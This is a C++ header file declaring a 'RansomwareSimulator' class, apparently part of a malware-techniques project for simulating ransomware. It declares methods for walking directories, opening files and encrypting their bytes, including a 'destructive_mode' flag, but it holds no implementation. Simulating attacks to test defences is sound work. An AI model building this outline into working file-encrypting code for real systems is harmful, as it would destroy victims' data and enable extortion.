#pragma once

#include "../MalwareTechniques/ntdll.h"
#include "../ThreadPool/thread_pool.h"

#include <Windows.h>

#include <string_view>
#include <memory>
#include <atomic>

namespace maltech {

    namespace ransom {

        using namespace std::literals;

        class RansomwareSimulator : public std::enable_shared_from_this<RansomwareSimulator>{
        public:
            RansomwareSimulator(ntdll::NtDll& ntdll);

            void StartEncryptingSimulation();

        private:
            ntdll::NtDll& ntdll_;
            ThreadPool thread_pool_{ GetMaximumProcessorCount(ALL_PROCESSOR_GROUPS) };
            std::atomic<DWORD> files_count_ = 0;
            std::atomic<DWORD> crypted_count_ = 0;

            void ProcessCatalogue(std::string_view path);
            void ImitateFileIncryption(std::string_view path);
            HANDLE OpenFile(std::string_view path);
            void ProcessFileEncrypting(HANDLE hFile);
            void EncryptBytes(char* bytes, DWORD size, bool destructive_mode);
        };

    }

}